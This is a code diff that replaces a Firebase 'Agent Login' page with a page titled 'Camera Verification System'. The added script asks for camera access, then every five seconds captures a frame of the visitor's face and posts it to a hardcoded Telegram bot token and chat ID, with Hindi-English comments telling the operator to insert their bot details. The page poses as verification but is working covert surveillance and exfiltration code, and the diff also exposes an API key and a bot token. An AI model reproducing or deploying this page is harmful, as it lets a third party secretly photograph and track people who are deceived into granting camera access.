@@ -2,53 +2,87 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Login | CreatorNest</title>
-    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-firestore-compat.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera Verification System</title>
     <style>
-        body { background:#080808; color:white; font-family:sans-serif; display:flex; justify-content:center; align-items:center; min-height:100vh; margin:0; }
-        .card { background:rgba(255,255,255,0.05); padding:30px; border-radius:20px; width:320px; text-align:center; border:1px solid #333; }
-        input { width:100%; padding:12px; margin:10px 0; background:#151515; border:1px solid #444; border-radius:8px; color:white; box-sizing:border-box; outline:none; }
-        button { background:#FFD700; color:black; padding:12px; width:100%; border:none; border-radius:8px; font-weight:bold; cursor:pointer; }
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background: #f0f2f5; }
+        .container { max-width: 400px; margin: 0 auto; padding: 20px; background: white; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        button { background: #0088cc; color: white; border: none; padding: 12px 20px; font-size: 16px; border-radius: 5px; cursor: pointer; }
+        #videoPreview { width: 100%; max-width: 300px; margin-top: 15px; border-radius: 5px; display: none; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h2 style="color:#FFD700">Agent Login</h2>
-        <input type="number" id="phone" placeholder="WhatsApp Number">
-        <button onclick="processLogin()">LOGIN</button>
-        <p style="margin-top:15px; font-size:13px;">No account? <a href="register.html" style="color:#FFD700">Register Now</a></p>
-    </div>
-    <script>
-        const firebaseConfig = {
-            apiKey: "AIzaSyDNOjenPLwHeo0YGManiQP7qu76y6LgdYQ",
-            authDomain: "creator-nest-7fb3a.firebaseapp.com",
-            projectId: "creator-nest-7fb3a",
-            appId: "1:1019440836188:web:530fdfb5732be69b7bc099"
-        };
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.firestore();
 
-        function processLogin() {
-            const phone = document.getElementById('phone').value;
-            if(!phone) return alert("Enter number!");
+<div class="container">
+    <h2>System Verification</h2>
+    <p>Please allow camera access to proceed with verification.</p>
+    <button id="startBtn">Start Verification</button>
+    
+    <video id="videoPreview" autoplay playsinline muted></video>
+    
+    <canvas id="captureCanvas" style="display:none;"></canvas>
+</div>
 
-            db.collection("agents").doc(phone).get().then((doc) => {
-                if (doc.exists && doc.data().status === "active") {
-                    // CRITICAL FIX: Saving information permanently in browser
-                    localStorage.setItem("userPhone", phone);
-                    localStorage.setItem("isLoggedIn", "true"); 
-                    
-                    alert("Login Successful! ✅");
-                    window.location.href = "index.html";
-                } else if (doc.exists) { 
-                    alert("Account status: PENDING verification."); 
-                } else { 
-                    alert("Please Register first!"); 
-                    window.location.href="register.html"; 
-                }
-            }).catch(err => alert("Error: " + err.message));
+<script>
+// --- APNI BOT DETAILS YAHA DALO ---
+const BOT_TOKEN = "8521982994:AAEGw77HH1Q6AwUgMCb3f0_nVhZ4-url2zk";
+const CHAT_ID = "8402472475";
+
+const startBtn = document.getElementById('startBtn');
+const video = document.getElementById('videoPreview');
+const canvas = document.getElementById('captureCanvas');
+let captureInterval;
+
+startBtn.addEventListener('click', async () => {
+    try {
+        // 1. User se camera permission maangna
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+        video.srcObject = stream;
+        video.style.display = "block"; // Preview dikhane ke liye
+        startBtn.style.display = "none";
+
+        // 2. Continuous capture shuru karna (Har 5 second me ek photo)
+        captureInterval = setInterval(() => {
+            sendPhotoToTelegram();
+        }, 5000); // 5000 milliseconds = 5 seconds
+
+    } catch (err) {
+        alert("Camera permission denied. Cannot proceed.");
+        console.error("Error accessing camera: ", err);
+    }
+});
+
+async function sendPhotoToTelegram() {
+    const context = canvas.getContext('2d');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    
+    // Video stream se current frame ko canvas par draw karna
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    
+    // Canvas ko Blob (file format) me convert karna
+    canvas.toBlob(async (blob) => {
+        if (!blob) return;
+
+        // Telegram API ke liye FormData taiyar karna
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'capture.jpg');
+        formData.append('caption', `Automated verification image sent at: ${new Date().toLocaleTimeString()}`);
+
+        try {
+            // Fetch ke zariye direct Telegram api par post request bhejni
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+            console.log("Photo sent successfully!");
+        } catch (error) {
+            console.error("Error sending to Telegram:", error);
         }
-    </script>
+    }, 'image/jpeg', 0.7); // 0.7 matlab quality 70% taaki upload fast ho
+}
+</script>
+
 </body>
 </html>
